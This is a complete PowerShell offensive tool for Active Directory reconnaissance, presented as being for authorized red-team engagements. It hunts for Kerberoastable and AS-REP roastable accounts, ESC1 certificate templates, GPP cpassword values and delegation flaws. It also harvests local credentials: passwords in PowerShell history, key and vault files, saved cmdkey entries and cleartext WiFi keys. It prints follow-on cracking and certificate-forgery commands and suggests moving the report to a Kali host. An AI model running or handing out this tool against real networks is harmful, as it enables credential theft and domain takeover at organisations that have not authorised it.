#Requires -Version 3.0
<#
.SYNOPSIS
    AD-Enumerate.ps1 — Full Native Active Directory Enumeration
    No external tools. No admin rights needed. Pure ADSI + .NET + built-in cmdlets.
    For use in authorized red team / internal penetration testing engagements ONLY.

.USAGE
    # Basic run (outputs to console + auto-saves report)
    powershell -ep bypass -File AD-Enumerate.ps1

    # Save output to file
    powershell -ep bypass -File AD-Enumerate.ps1 | Tee-Object -FilePath C:\Users\Public\ad-report.txt

.NOTES
    All queries run as the current logged-on domain user.
    Standard domain users can read ~95% of AD via LDAP — no elevation needed.
#>

# ── Output Config ─────────────────────────────────────────────────────────────
$OutputFile = "$env:USERPROFILE\Documents\AD-Enum-$(Get-Date -Format 'yyyyMMdd-HHmm').txt"
$Script:Results = [System.Collections.Generic.List[string]]::new()

# ── Helpers ───────────────────────────────────────────────────────────────────
function Write-Section {
    param([string]$Title)
    $line = "=" * 60
    $header = @"

$line
  $Title
$line
"@
    Write-Host $header -ForegroundColor Cyan
    $Script:Results.Add($header)
}

function Write-Item {
    param([string]$Text, [string]$Color = "White")
    Write-Host "  $Text" -ForegroundColor $Color
    $Script:Results.Add("  $Text")
}

function Write-Hit {
    param([string]$Text)
    Write-Host "  [!] $Text" -ForegroundColor Red
    $Script:Results.Add("  [!] $Text")
}

function Write-Find {
    param([string]$Text)
    Write-Host "  [+] $Text" -ForegroundColor Green
    $Script:Results.Add("  [+] $Text")
}

function Get-ADSearcher {
    param([string]$Filter, [string[]]$Properties = @("*"), [string]$SearchRoot = "")
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $root   = if ($SearchRoot) { $SearchRoot } else { "LDAP://$($domain.Name)" }
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.SearchRoot  = New-Object System.DirectoryServices.DirectoryEntry($root)
    $searcher.Filter      = $Filter
    $searcher.PageSize    = 1000
    $searcher.SizeLimit   = 0
    foreach ($p in $Properties) { $searcher.PropertiesToLoad.Add($p) | Out-Null }
    return $searcher
}

function Convert-UAC {
    param([int]$UAC)
    $flags = @{
        512     = "NORMAL_ACCOUNT"
        2       = "ACCOUNTDISABLE"
        64      = "PASSWD_NOTREQD"
        65536   = "DONT_EXPIRE_PASSWORD"
        4194304 = "DONT_REQ_PREAUTH"
        524288  = "TRUSTED_FOR_DELEGATION"
        16777216= "TRUSTED_TO_AUTH_FOR_DELEGATION"
        1048576 = "NOT_DELEGATED"
    }
    ($flags.GetEnumerator() | Where-Object { $UAC -band $_.Key } | Select-Object -Expand Value) -join " | "
}

function Convert-FileTime {
    param($ft)
    if ($ft -is [System.DirectoryServices.ResultPropertyValueCollection]) { $ft = $ft[0] }
    if ($null -eq $ft -or $ft -eq 0 -or $ft -eq 9223372036854775807) { return "Never" }
    try { return [datetime]::FromFileTime($ft).ToString("yyyy-MM-dd HH:mm") } catch { return "N/A" }
}

# ══════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] AD-Enumerate.ps1 — Starting..." -ForegroundColor Yellow
Write-Host "[*] Running as: $env:USERDOMAIN\$env:USERNAME" -ForegroundColor Yellow
$Script:Results.Add("AD Enumeration Report — $(Get-Date)")
$Script:Results.Add("Run as: $env:USERDOMAIN\$env:USERNAME`n")

# ── 1. DOMAIN INFO ────────────────────────────────────────────────────────────
Write-Section "1. DOMAIN INFORMATION"
try {
    $domain     = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $forest     = $domain.Forest
    $domainDN   = "DC=" + ($domain.Name -replace "\.",",DC=")

    Write-Find "Domain Name        : $($domain.Name)"
    Write-Find "Domain DN          : $domainDN"
    Write-Find "Forest Name        : $($forest.Name)"
    Write-Find "Forest Func Level  : $($forest.ForestMode)"
    Write-Find "Domain Func Level  : $($domain.DomainMode)"
    Write-Find "Domain Controllers : $($domain.DomainControllers -join ', ')"
    Write-Find "PDC Emulator       : $($domain.PdcRoleOwner)"
    Write-Find "RID Master         : $($domain.RidRoleOwner)"
    Write-Find "Infra Master       : $($domain.InfrastructureRoleOwner)"

    # Domain SID
    $domainObj = ([adsisearcher]"(objectClass=domain)").FindOne()
    $sid = New-Object System.Security.Principal.SecurityIdentifier(
        $domainObj.Properties['objectsid'][0], 0)
    Write-Find "Domain SID         : $sid"
} catch { Write-Item "Error: $_" "Red" }

# ── 2. PASSWORD POLICY ────────────────────────────────────────────────────────
Write-Section "2. PASSWORD & LOCKOUT POLICY"
try {
    $pp = ([adsisearcher]"(objectClass=domain)").FindOne().Properties
    $minLen  = $pp['minpwdlength'][0]
    $history = $pp['pwdhistorylength'][0]
    $complex = $pp['pwdproperties'][0]
    $maxAge  = [timespan]::FromTicks([math]::Abs($pp['maxpwdage'][0])).Days
    $minAge  = [timespan]::FromTicks([math]::Abs($pp['minpwdage'][0])).Days
    $lockThr = $pp['lockoutthreshold'][0]
    $lockDur = [timespan]::FromTicks([math]::Abs($pp['lockoutduration'][0])).Minutes

    Write-Find "Min Password Length   : $minLen"
    Write-Find "Password History      : $history"
    Write-Find "Max Password Age      : $maxAge days"
    Write-Find "Min Password Age      : $minAge days"
    Write-Find "Complexity Enabled    : $(if($complex -band 1){'YES'}else{'NO'})"
    if ($lockThr -eq 0) {
        Write-Hit "Lockout Threshold: 0  ← NO LOCKOUT — Brute force possible!"
    } else {
        Write-Find "Lockout Threshold     : $lockThr attempts"
        Write-Find "Lockout Duration      : $lockDur minutes"
    }

    # Fine-grained password policies
    $fgpp = (Get-ADSearcher -Filter "(objectClass=msDS-PasswordSettings)").FindAll()
    if ($fgpp.Count -gt 0) {
        Write-Hit "$($fgpp.Count) Fine-Grained Password Policy(ies) found:"
        foreach ($f in $fgpp) {
            Write-Item "  → $($f.Properties['name'][0]) | MinLen=$($f.Properties['msds-minimumpasswordlength'][0]) | AppliesTo=$($f.Properties['msds-psoappliesto'])"
        }
    }
} catch { Write-Item "Error: $_" "Red" }

# ── 3. USERS ──────────────────────────────────────────────────────────────────
Write-Section "3. USER ACCOUNTS"
try {
    $userProps = @('samaccountname','displayname','description','memberof',
                   'lastlogontimestamp','pwdlastset','useraccountcontrol',
                   'serviceprincipalname','admincount','mail','whencreated')

    $allUsers = (Get-ADSearcher -Filter "(&(objectClass=user)(objectCategory=person))" `
                 -Properties $userProps).FindAll()

    Write-Find "Total user accounts  : $($allUsers.Count)"

    # Enabled users
    $enabled = $allUsers | Where-Object { -not ($_.Properties['useraccountcontrol'][0] -band 2) }
    Write-Find "Enabled accounts     : $($enabled.Count)"

    # Admin accounts (adminCount=1)
    $admins = $allUsers | Where-Object { $_.Properties['admincount'][0] -eq 1 }
    Write-Hit "AdminCount=1 users   : $($admins.Count) (privileged / protected)"
    foreach ($a in $admins) {
        $uac = $a.Properties['useraccountcontrol'][0]
        $ll  = Convert-FileTime $a.Properties['lastlogontimestamp'][0]
        Write-Item "    $($a.Properties['samaccountname'][0]) | UAC=$(Convert-UAC $uac) | LastLogon=$ll"
    }

    # Never-logged-on enabled accounts
    $neverLogon = $enabled | Where-Object {
        $ll = $_.Properties['lastlogontimestamp']
        ($ll.Count -eq 0 -or $ll[0] -eq 0)
    }
    Write-Item "`n  Never-logged-on enabled accounts : $($neverLogon.Count)"

    # Password never expires
    $noExpire = $enabled | Where-Object { $_.Properties['useraccountcontrol'][0] -band 65536 }
    Write-Hit "Password never expires: $($noExpire.Count) accounts"
    foreach ($u in $noExpire | Select-Object -First 20) {
        Write-Item "    → $($u.Properties['samaccountname'][0])"
    }

    # Password not required
    $noPassReq = $enabled | Where-Object { $_.Properties['useraccountcontrol'][0] -band 32 }
    if ($noPassReq.Count -gt 0) {
        Write-Hit "Password NOT required : $($noPassReq.Count) accounts — potential empty password!"
        foreach ($u in $noPassReq) { Write-Item "    → $($u.Properties['samaccountname'][0])" }
    }

    # Accounts with description (may contain passwords)
    Write-Item "`n  Accounts with Description field (check for creds):"
    $withDesc = $enabled | Where-Object { $_.Properties['description'].Count -gt 0 -and $_.Properties['description'][0] -ne "" }
    foreach ($u in $withDesc) {
        Write-Hit "    $($u.Properties['samaccountname'][0]) : $($u.Properties['description'][0])"
    }

} catch { Write-Item "Error: $_" "Red" }

# ── 4. KERBEROASTABLE ACCOUNTS ────────────────────────────────────────────────
Write-Section "4. KERBEROASTABLE ACCOUNTS (SPN Set)"
try {
    $kerbProps = @('samaccountname','serviceprincipalname','memberof',
                   'admincount','useraccountcontrol','pwdlastset','lastlogontimestamp')
    $kerb = (Get-ADSearcher `
        -Filter "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" `
        -Properties $kerbProps).FindAll()

    Write-Hit "Kerberoastable accounts: $($kerb.Count)"
    foreach ($k in $kerb) {
        $sam  = $k.Properties['samaccountname'][0]
        $spns = $k.Properties['serviceprincipalname']
        $admin = $k.Properties['admincount'][0]
        $pls  = Convert-FileTime $k.Properties['pwdlastset'][0]
        Write-Hit "  → $sam$(if($admin -eq 1){' [ADMIN!]'}) | PwdLastSet=$pls"
        foreach ($s in $spns) { Write-Item "      SPN: $s" }
    }
} catch { Write-Item "Error: $_" "Red" }

# ── 5. AS-REP ROASTABLE ───────────────────────────────────────────────────────
Write-Section "5. AS-REP ROASTABLE ACCOUNTS (Pre-Auth Disabled)"
try {
    $asrep = (Get-ADSearcher `
        -Filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" `
        -Properties @('samaccountname','memberof','admincount')).FindAll()

    if ($asrep.Count -gt 0) {
        Write-Hit "AS-REP Roastable accounts: $($asrep.Count)"
        foreach ($a in $asrep) {
            $admin = $a.Properties['admincount'][0]
            Write-Hit "  → $($a.Properties['samaccountname'][0])$(if($admin -eq 1){' [ADMIN!]'})"
        }
        Write-Item ""
        Write-Item "  Crack offline (from Kali):"
        Write-Item "  impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt"
        Write-Item "  hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
    } else {
        Write-Find "No AS-REP roastable accounts found"
    }
} catch { Write-Item "Error: $_" "Red" }

# ── 6. DELEGATION ─────────────────────────────────────────────────────────────
Write-Section "6. DELEGATION MISCONFIGURATIONS"
try {
    # Unconstrained delegation (excluding DCs)
    $uncons = (Get-ADSearcher `
        -Filter "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516))(!(primaryGroupID=521)))" `
        -Properties @('samaccountname','dnshostname','objectClass')).FindAll()

    if ($uncons.Count -gt 0) {
        Write-Hit "UNCONSTRAINED Delegation (critical): $($uncons.Count) objects"
        foreach ($u in $uncons) {
            $name = if ($u.Properties['dnshostname'].Count) { $u.Properties['dnshostname'][0] } else { $u.Properties['samaccountname'][0] }
            Write-Hit "  → $name"
        }
    }

    # Constrained delegation
    $cons = (Get-ADSearcher `
        -Filter "(msDS-AllowedToDelegateTo=*)" `
        -Properties @('samaccountname','dnshostname','msDS-AllowedToDelegateTo')).FindAll()

    if ($cons.Count -gt 0) {
        Write-Hit "CONSTRAINED Delegation: $($cons.Count) objects"
        foreach ($c in $cons) {
            $name = if ($c.Properties['dnshostname'].Count) { $c.Properties['dnshostname'][0] } else { $c.Properties['samaccountname'][0] }
            Write-Find "  → $name delegates to:"
            foreach ($t in $c.Properties['msds-allowedtodelegateto']) { Write-Item "      $t" }
        }
    }

    # Resource-Based Constrained Delegation
    $rbcd = (Get-ADSearcher `
        -Filter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" `
        -Properties @('samaccountname','dnshostname')).FindAll()

    if ($rbcd.Count -gt 0) {
        Write-Hit "RESOURCE-BASED Constrained Delegation: $($rbcd.Count) objects"
        foreach ($r in $rbcd) {
            Write-Hit "  → $($r.Properties['samaccountname'][0])"
        }
    }
} catch { Write-Item "Error: $_" "Red" }

# ── 7. GROUPS ─────────────────────────────────────────────────────────────────
Write-Section "7. PRIVILEGED GROUPS"
try {
    $privGroups = @(
        "Domain Admins", "Enterprise Admins", "Schema Admins",
        "Administrators", "Account Operators", "Backup Operators",
        "Print Operators", "Server Operators", "Group Policy Creator Owners",
        "Remote Management Users", "DnsAdmins", "Exchange Windows Permissions"
    )

    foreach ($grp in $privGroups) {
        $result = (Get-ADSearcher -Filter "(&(objectClass=group)(cn=$grp))" `
                   -Properties @('member','cn')).FindOne()
        if ($result) {
            $members = $result.Properties['member']
            Write-Find "$grp : $($members.Count) member(s)"
            foreach ($m in $members) {
                # Extract CN from DN
                $cn = ($m -split ',')[0] -replace 'CN=',''
                Write-Item "    → $cn"
            }
        }
    }

    # Find groups with unusual admin-like keywords
    Write-Item "`n  Custom groups with admin/priv keywords:"
    $customAdminGroups = (Get-ADSearcher `
        -Filter "(&(objectClass=group)(|(cn=*admin*)(cn=*priv*)(cn=*tier*)(cn=*paw*)))" `
        -Properties @('cn','member')).FindAll()
    foreach ($g in $customAdminGroups) {
        Write-Hit "  Custom: $($g.Properties['cn'][0]) ($($g.Properties['member'].Count) members)"
    }
} catch { Write-Item "Error: $_" "Red" }

# ── 8. COMPUTERS ──────────────────────────────────────────────────────────────
Write-Section "8. COMPUTERS & SERVERS"
try {
    $compProps = @('name','dnshostname','operatingsystem','operatingsystemversion',
                   'lastlogontimestamp','useraccountcontrol','serviceprincipalname')

    $allComps = (Get-ADSearcher -Filter "(objectClass=computer)" `
                 -Properties $compProps).FindAll()
    Write-Find "Total computers: $($allComps.Count)"

    # Domain Controllers
    $dcs = (Get-ADSearcher `
        -Filter "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" `
        -Properties $compProps).FindAll()
    Write-Find "`n  Domain Controllers ($($dcs.Count)):"
    foreach ($dc in $dcs) {
        Write-Hit "    $($dc.Properties['dnshostname'][0]) | OS: $($dc.Properties['operatingsystem'][0])"
    }

    # OS breakdown
    Write-Item "`n  OS Breakdown:"
    $osGroups = $allComps | Group-Object { $_.Properties['operatingsystem'][0] } |
        Sort-Object Count -Descending
    foreach ($os in $osGroups) {
        $label = if ($os.Name -match "2003|2008|XP|Vista|Windows 7") { "  [LEGACY!]" } else { "" }
        Write-Item "    $($os.Name) : $($os.Count)$label"
        if ($label) { Write-Hit "    ^ LEGACY OS — likely unpatched, high value target" }
    }

    # Computers with Unconstrained Delegation (non-DC) already shown above
    # LAPS check
    $withLAPS = $allComps | Where-Object { $_.Properties['ms-mcs-admpwdexpirationtime'].Count -gt 0 }
    $noLAPS   = $allComps | Where-Object { $_.Properties['ms-mcs-admpwdexpirationtime'].Count -eq 0 }
    Write-Item "`n  LAPS Status:"
    Write-Find "    LAPS deployed   : $($withLAPS.Count)"
    if ($noLAPS.Count -gt 0) {
        Write-Hit "    No LAPS         : $($noLAPS.Count) machines — local admin pw may be shared!"
    }

    # Stale computers (not logged in for 90+ days)
    $cutoff = (Get-Date).AddDays(-90).ToFileTime()
    $stale = $allComps | Where-Object {
        $ll = $_.Properties['lastlogontimestamp']
        $ll.Count -gt 0 -and $ll[0] -lt $cutoff -and $ll[0] -gt 0
    }
    Write-Hit "`n  Stale computers (90+ days no logon): $($stale.Count)"
} catch { Write-Item "Error: $_" "Red" }

# ── 9. GPO ENUMERATION ────────────────────────────────────────────────────────
Write-Section "9. GROUP POLICY OBJECTS"
try {
    $gpos = (Get-ADSearcher `
        -Filter "(objectClass=groupPolicyContainer)" `
        -Properties @('displayname','cn','gpcfilesyspath','whencreated','whenchanged')).FindAll()

    Write-Find "Total GPOs: $($gpos.Count)"
    Write-Item "`n  GPO List:"
    foreach ($g in $gpos) {
        $name    = $g.Properties['displayname'][0]
        $path    = $g.Properties['gpcfilesyspath'][0]
        $changed = $g.Properties['whenchanged'][0]
        Write-Item "    [$($g.Properties['cn'][0])] $name"
        Write-Item "      Path: $path"

        # Check if GPO path is readable and look for cpassword (Group Policy Preferences)
        if ($path) {
            $gppPath = "$path\MACHINE\Preferences\Groups\Groups.xml"
            if (Test-Path $gppPath) {
                $content = Get-Content $gppPath -ErrorAction SilentlyContinue
                if ($content -match "cpassword") {
                    Write-Hit "      *** GPP PASSWORD (cpassword) FOUND in $gppPath ***"
                    Write-Hit "      Decrypt: gpp-decrypt <hash>  (from Kali)"
                }
            }
        }
    }

    # Also check SYSVOL directly for cpassword
    Write-Item "`n  Scanning SYSVOL for cpassword (GPP passwords)..."
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $sysvol = "\\$($domain.Name)\SYSVOL"
    if (Test-Path $sysvol) {
        Get-ChildItem -Path $sysvol -Recurse -Include "*.xml" -ErrorAction SilentlyContinue |
        Select-String -Pattern "cpassword" -ErrorAction SilentlyContinue |
        ForEach-Object {
            Write-Hit "    cpassword found: $($_.Path)"
            Write-Hit "    Line: $($_.Line.Trim())"
        }
    }
} catch { Write-Item "Error: $_" "Red" }

# ── 10. SHARES ENUMERATION ────────────────────────────────────────────────────
Write-Section "10. NETWORK SHARES"
try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $dcs    = $domain.DomainControllers

    # Check well-known shares on DCs
    foreach ($dc in $dcs) {
        Write-Item "`n  Shares on DC: $($dc.Name)"
        try {
            $shares = net view "\\$($dc.Name)" 2>$null
            foreach ($line in $shares) {
                if ($line -match "Disk") { Write-Find "    $line" }
            }
        } catch { Write-Item "    Could not enumerate (access denied or firewall)" }
    }

    # Check SYSVOL / NETLOGON access
    $domain  = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $targets = @("\\$($domain.Name)\SYSVOL", "\\$($domain.Name)\NETLOGON")
    foreach ($t in $targets) {
        if (Test-Path $t -ErrorAction SilentlyContinue) {
            Write-Find "  Accessible: $t"
            # Look for scripts with creds
            Get-ChildItem $t -Recurse -ErrorAction SilentlyContinue |
            Where-Object { $_.Extension -in @('.bat','.cmd','.ps1','.vbs') } |
            ForEach-Object { Write-Hit "    Script found: $($_.FullName)" }
        } else {
            Write-Item "  Not accessible: $t"
        }
    }
} catch { Write-Item "Error: $_" "Red" }

# ── 11. ADCS — CERTIFICATE SERVICES ──────────────────────────────────────────
Write-Section "11. ACTIVE DIRECTORY CERTIFICATE SERVICES (ADCS)"
try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $domainDN = "DC=" + ($domain.Name -replace "\.",",DC=")

    # Check if ADCS exists
    $pki = (Get-ADSearcher `
        -Filter "(objectClass=pKIEnrollmentService)" `
        -Properties @('cn','dnshostname','certificatetemplates') `
        -SearchRoot "LDAP://CN=Configuration,$domainDN").FindAll()

    if ($pki.Count -gt 0) {
        Write-Hit "ADCS Found! $($pki.Count) CA(s):"
        foreach ($ca in $pki) {
            Write-Hit "  CA Name : $($ca.Properties['cn'][0])"
            Write-Find "  CA Host : $($ca.Properties['dnshostname'][0])"
            Write-Item "  Templates ($($ca.Properties['certificatetemplates'].Count)):"

            foreach ($tmpl in $ca.Properties['certificatetemplates']) {
                Write-Item "    - $tmpl"
            }
        }

        # Check for vulnerable templates (ESC1 — enrollee can supply SAN)
        Write-Item "`n  Checking certificate templates for ESC1 (enrollee-supplied SAN)..."
        $vulnTemplates = (Get-ADSearcher `
            -Filter "(&(objectClass=pKICertificateTemplate)(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))" `
            -Properties @('cn','mspki-certificate-application-policy','pkiextendedkeyusage','mspki-enrollment-flag') `
            -SearchRoot "LDAP://CN=Configuration,$domainDN").FindAll()

        if ($vulnTemplates.Count -gt 0) {
            Write-Hit "  ESC1 Candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT): $($vulnTemplates.Count)"
            foreach ($t in $vulnTemplates) {
                Write-Hit "    Template: $($t.Properties['cn'][0])"
                Write-Item "      EKU: $($t.Properties['pkiextendedkeyusage'])"
            }
            Write-Item ""
            Write-Item "  Exploit from Kali: certipy find -u user -p pass -dc-ip <DC_IP>"
            Write-Item "                     certipy req -ca <CA> -template <Template> -upn admin@domain"
        }
    } else {
        Write-Find "No ADCS / Certificate Services found"
    }
} catch { Write-Item "Error: $_" "Red" }

# ── 12. TRUSTS ────────────────────────────────────────────────────────────────
Write-Section "12. DOMAIN TRUSTS"
try {
    $trusts = (Get-ADSearcher `
        -Filter "(objectClass=trustedDomain)" `
        -Properties @('cn','trusttype','trustdirection','trustattributes')).FindAll()

    if ($trusts.Count -gt 0) {
        Write-Hit "Domain Trusts ($($trusts.Count)):"
        $trustDir = @{1="Inbound";2="Outbound";3="Bidirectional"}
        $trustType = @{1="Downlevel";2="Uplevel";3="MIT";4="DCE"}
        foreach ($t in $trusts) {
            $dir  = $trustDir[[int]$t.Properties['trustdirection'][0]]
            $type = $trustType[[int]$t.Properties['trusttype'][0]]
            $attr = [int]$t.Properties['trustattributes'][0]
            Write-Hit "  → $($t.Properties['cn'][0]) | Type=$type | Dir=$dir | Attr=$attr"
            if ($attr -band 8)  { Write-Hit "    SID Filtering DISABLED — SID History abuse possible!" }
            if ($attr -band 32) { Write-Hit "    TGT Delegation enabled — cross-domain attack possible!" }
        }
    } else {
        Write-Find "No external trusts found"
    }
} catch { Write-Item "Error: $_" "Red" }

# ── 13. OUs & ADMIN STRUCTURE ────────────────────────────────────────────────
Write-Section "13. OU STRUCTURE & GPO LINKS"
try {
    $ous = (Get-ADSearcher `
        -Filter "(objectClass=organizationalUnit)" `
        -Properties @('distinguishedname','gplink','name')).FindAll()

    Write-Find "Total OUs: $($ous.Count)"
    foreach ($ou in $ous | Select-Object -First 30) {
        $gpl = $ou.Properties['gplink'][0]
        $marker = if ($gpl) { " [GPO linked]" } else { "" }
        Write-Item "  $($ou.Properties['name'][0])$marker"
    }
} catch { Write-Item "Error: $_" "Red" }

# ── 14. CURRENT USER CONTEXT ──────────────────────────────────────────────────
Write-Section "14. CURRENT USER CONTEXT & PRIVILEGES"
try {
    Write-Find "Username     : $env:USERDOMAIN\$env:USERNAME"
    Write-Find "Computer     : $env:COMPUTERNAME"
    Write-Find "LogonServer  : $env:LOGONSERVER"

    # Token privileges
    Write-Item "`n  Token Privileges:"
    $privOutput = whoami /priv 2>&1
    foreach ($line in $privOutput) {
        if ($line -match "SeDebug|SeImpersonate|SeAssignPrimary|SeTakeOwner|SeBackup|SeRestore|SeShutdown|SeTcb") {
            Write-Hit "  $line"
        } elseif ($line -match "Enabled") {
            Write-Find "  $line"
        }
    }

    # Group membership
    Write-Item "`n  Group Memberships:"
    $groups = whoami /groups 2>&1
    foreach ($line in $groups) {
        if ($line -match "Domain Admins|Enterprise Admins|Schema Admins|Administrators|Backup Operators|DnsAdmins") {
            Write-Hit "  $line"
        } elseif ($line -match "S-1-5") {
            Write-Item "  $line"
        }
    }

    # Check local admin on this machine
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
    if ($isAdmin) { Write-Hit "LOCAL ADMIN on this machine!" }
    else { Write-Find "Standard user (no local admin)" }

} catch { Write-Item "Error: $_" "Red" }

# ── 15. LOCAL CREDENTIALS & INTERESTING FILES ─────────────────────────────────
Write-Section "15. INTERESTING LOCAL FILES & CREDENTIALS"
try {
    $interestingPaths = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads",
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",  # PS history!
        "$env:LOCALAPPDATA\Microsoft\Remote Desktop Connection Manager",
        "C:\inetpub",
        "C:\scripts",
        "C:\backup",
        "C:\admin"
    )

    # PowerShell history (gold mine)
    $psHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $psHistory) {
        Write-Hit "PowerShell history found: $psHistory"
        $hist = Get-Content $psHistory -ErrorAction SilentlyContinue
        $credLines = $hist | Select-String -Pattern "password|passwd|cred|secret|token|key|-p |invoke-" -CaseSensitive:$false
        foreach ($l in $credLines | Select-Object -First 20) {
            Write-Hit "  History: $($l.Line.Trim())"
        }
    }

    # Interesting files
    Write-Item "`n  Searching for interesting files..."
    $patterns = @("*password*","*cred*","*secret*","*config*","*.kdbx","*.pfx","*.key","id_rsa*","*.rdp")
    foreach ($dir in @("$env:USERPROFILE","C:\scripts","C:\backup","C:\admin")) {
        if (Test-Path $dir) {
            Get-ChildItem $dir -Recurse -Include $patterns -ErrorAction SilentlyContinue |
            Select-Object -First 10 |
            ForEach-Object { Write-Hit "  Found: $($_.FullName)" }
        }
    }

    # Saved RDP credentials
    $rdpCreds = cmdkey /list 2>&1
    if ($rdpCreds -match "Target") {
        Write-Hit "`n  Saved Windows Credentials (cmdkey):"
        $rdpCreds | Where-Object { $_ -match "Target|User" } | ForEach-Object { Write-Hit "  $_" }
    }

    # WiFi passwords (if applicable)
    Write-Item "`n  Saved WiFi profiles:"
    $wifiProfiles = netsh wlan show profiles 2>&1
    if ($wifiProfiles -notmatch "not running") {
        $profiles = ($wifiProfiles | Select-String "All User Profile").Matches.Value -replace ".*: "
        foreach ($p in $profiles) {
            $key = netsh wlan show profile name="$p" key=clear 2>&1 | Select-String "Key Content"
            if ($key) { Write-Hit "  WiFi: $p → $key" }
        }
    }
} catch { Write-Item "Error: $_" "Red" }

# ── 16. QUICK WINS SUMMARY ────────────────────────────────────────────────────
Write-Section "16. ATTACK PATH QUICK-WINS SUMMARY"
Write-Hit "Review sections above for [!] markers — those are your priority targets."
Write-Item ""
Write-Item "  Top attack paths to investigate:"
Write-Item "  1. Kerberoast  → crack SPNs offline → hashcat -m 13100"
Write-Item "  2. AS-REP roast → crack hashes      → hashcat -m 18200"
Write-Item "  3. ADCS ESC1   → forge cert as DA   → certipy (from Kali)"
Write-Item "  4. GPP cpassword → instant DA creds → gpp-decrypt (from Kali)"
Write-Item "  5. Unconstrained delegation + coerce auth (PetitPotam/PrintSpooler)"
Write-Item "  6. ACL abuse paths → run BloodHound → find GenericWrite/WriteDACL"
Write-Item ""
Write-Item "  From Kali (using creds found above, no agent needed):"
Write-Item "  bloodhound-python -u user -p pass -d domain.local -c All --zip"
Write-Item "  impacket-GetUserSPNs domain/user:pass -dc-ip <DC> -request"
Write-Item "  impacket-GetNPUsers domain/ -usersfile users.txt -format hashcat"
Write-Item "  certipy find -u user -p pass -dc-ip <DC>"

# ── Save Report ───────────────────────────────────────────────────────────────
Write-Host "`n[*] Saving report to: $OutputFile" -ForegroundColor Yellow
$Script:Results | Out-File -FilePath $OutputFile -Encoding UTF8
Write-Host "[+] Done. Report saved to: $OutputFile" -ForegroundColor Green
Write-Host "[*] Transfer report to Kali: python3 -m http.server 9090 (from report dir)" -ForegroundColor Yellow
